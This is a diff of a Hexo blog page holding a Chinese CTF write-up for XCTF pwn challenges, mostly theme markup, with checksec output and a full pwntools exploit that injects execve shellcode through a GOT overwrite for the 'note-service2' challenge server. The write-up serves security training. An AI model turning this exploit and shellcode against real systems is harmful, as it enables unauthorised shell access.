@@ -1,162 +1,386 @@
 <!DOCTYPE html>
-<html lang=en>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
 <head><meta name="generator" content="Hexo 3.9.0">
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="pwn1分析程序123456gdb-peda$ checksec babystackCANARY    : ENABLEDFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULL  我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：  通过程序的print函数lea">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,canary,栈溢出,ROP,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Apr1L's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="pwn1分析程序123456gdb-peda$ checksec babystackCANARY    : ENABLEDFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULL  我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：  通过程序的print函数l">
 <meta name="keywords" content="pwn,canary,栈溢出,ROP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界">
 <meta property="og:url" content="http://suvii22.github.io/2019/10/08/攻防世界/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="pwn1分析程序123456gdb-peda$ checksec babystackCANARY    : ENABLEDFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULL  我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：  通过程序的print函数lea">
+<meta property="og:description" content="pwn1分析程序123456gdb-peda$ checksec babystackCANARY    : ENABLEDFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULL  我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：  通过程序的print函数l">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/IAHJQkjthPfp8gw.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/FfT3lhC5N2bksLm.png">
-<meta property="og:updated_time" content="2020-09-01T11:52:13.128Z">
+<meta property="og:updated_time" content="2020-09-18T06:09:57.776Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界">
-<meta name="twitter:description" content="pwn1分析程序123456gdb-peda$ checksec babystackCANARY    : ENABLEDFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULL  我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：  通过程序的print函数lea">
+<meta name="twitter:description" content="pwn1分析程序123456gdb-peda$ checksec babystackCANARY    : ENABLEDFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULL  我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：  通过程序的print函数l">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/08/IAHJQkjthPfp8gw.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>攻防世界</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
-</head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/categories/">categories</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/10/27/wiki/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://suvii22.github.io/2019/10/08/攻防世界/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://suvii22.github.io/2019/10/08/攻防世界/&text=攻防世界"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://suvii22.github.io/2019/10/08/攻防世界/&is_video=false&description=攻防世界"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=攻防世界&body=Check out this article: http://suvii22.github.io/2019/10/08/攻防世界/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://suvii22.github.io/2019/10/08/攻防世界/&title=攻防世界"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://suvii22.github.io/2019/10/08/攻防世界/&name=攻防世界&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://suvii22.github.io/2019/10/08/攻防世界/&t=攻防世界"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">1.</span> <span class="toc-text">pwn1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序"><span class="toc-number">1.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接"><span class="toc-number">1.3.</span> <span class="toc-text">相关链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-100"><span class="toc-number">2.</span> <span class="toc-text">pwn-100</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DynELF"><span class="toc-number">2.1.</span> <span class="toc-text">DynELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用条件"><span class="toc-number">2.2.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接-1"><span class="toc-number">2.4.</span> <span class="toc-text">相关链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mary-Morton"><span class="toc-number">3.</span> <span class="toc-text">Mary_Morton</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-1"><span class="toc-number">3.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定偏移"><span class="toc-number">3.2.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击"><span class="toc-number">3.3.</span> <span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack2"><span class="toc-number">4.</span> <span class="toc-text">stack2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#welpwn"><span class="toc-number">5.</span> <span class="toc-text">welpwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">5.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-formatter"><span class="toc-number">6.</span> <span class="toc-text">Time formatter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note-service2"><span class="toc-number">7.</span> <span class="toc-text">note-service2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">7.1.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">7.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        攻防世界
-    </h1>
 
 
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">Apr1L's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-10-08T12:16:50.000Z" itemprop="datePublished">2019-10-08</time>
-        
-      
-    </div>
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
 
 
-      
-    <div class="article-category">
-        <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/pwn/">pwn</a> › <a class="category-link" href="/categories/pwn/wp/">wp</a>
-    </div>
+
+  <link rel="canonical" href="http://suvii22.github.io/2019/10/08/攻防世界/">
 
 
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/ROP/">ROP</a>, <a class="tag-link" href="/tags/canary/">canary</a>, <a class="tag-link" href="/tags/pwn/">pwn</a>, <a class="tag-link" href="/tags/栈溢出/">栈溢出</a>
-    </div>
 
 
-    </div>
-  </header>
+
+  <title>攻防世界 | Apr1L's blog</title>
   
 
-  <div class="content" itemprop="articleBody">
-    <h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec babystack</span><br><span class="line">CANARY    : <span class="type">ENABLED</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">ENABLED</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">FULL</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1492608f41d9f4aca00f135cccb18cda";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Apr1L's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Apr1L</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/10/08/攻防世界/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Apr1L">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Apr1L's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">攻防世界</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-08T20:16:50+08:00">
+                2019-10-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/wp/" itemprop="url" rel="index">
+                    <span itemprop="name">wp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote class="blockquote-center"></blockquote>
+
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec babystack</span><br><span class="line">CANARY    : <span class="type">ENABLED</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">ENABLED</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">FULL</span></span><br></pre></td></tr></table></figure>
 
 <p>我们发现程序存在<code>canary</code>，并且没有<code>system</code>和<code>/bin/sh</code>，于是我们的思路就有了：</p>
 <ul>
@@ -232,130 +456,408 @@
 <h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#p = process('./note')</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'37156'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(ch)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,str(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    idx=(elf.got[<span class="string">'free'</span>]<span class="number">-0x2020A0</span>)/<span class="number">8</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">    add(idx,<span class="number">8</span>,<span class="string">'\x48\x31\xf6\x90\x90\xeb\x19'</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'\xb8\x3b\x00\x00\x00\xeb\x19'</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">8</span>,<span class="string">'\x48\x31\xd2\x90\x90\xeb\x19'</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">8</span>,<span class="string">'\x0f\x05\x90\x90\x90\x90\x90'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-  </div>
-</article>
+      
+    </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/canary/" rel="tag"># canary</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+            <a href="/tags/ROP/" rel="tag"># ROP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/27/wiki/" rel="prev" title="wiki">
+                wiki <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Apr1L">
+            
+              <p class="site-author-name" itemprop="name">Apr1L</p>
+              <p class="site-description motion-element" itemprop="description">二进制萌新QAQ</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">1.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.2.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关链接"><span class="nav-number">1.3.</span> <span class="nav-text">相关链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-100"><span class="nav-number">2.</span> <span class="nav-text">pwn-100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DynELF"><span class="nav-number">2.1.</span> <span class="nav-text">DynELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用条件"><span class="nav-number">2.2.</span> <span class="nav-text">使用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关链接-1"><span class="nav-number">2.4.</span> <span class="nav-text">相关链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mary-Morton"><span class="nav-number">3.</span> <span class="nav-text">Mary_Morton</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序-1"><span class="nav-number">3.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定偏移"><span class="nav-number">3.2.</span> <span class="nav-text">确定偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击"><span class="nav-number">3.3.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack2"><span class="nav-number">4.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#welpwn"><span class="nav-number">5.</span> <span class="nav-text">welpwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Time-formatter"><span class="nav-number">6.</span> <span class="nav-text">Time formatter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note-service2"><span class="nav-number">7.</span> <span class="nav-text">note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">7.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">7.2.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
 
 
         
-          <div id="footer-post-container">
-  <div id="footer-post">
+      </div>
+    </main>
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/categories/">categories</a></li>
-        
-      </ul>
-    </div>
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Apr1L</span>
 
-    <div id="toc-footer" style="display: none">
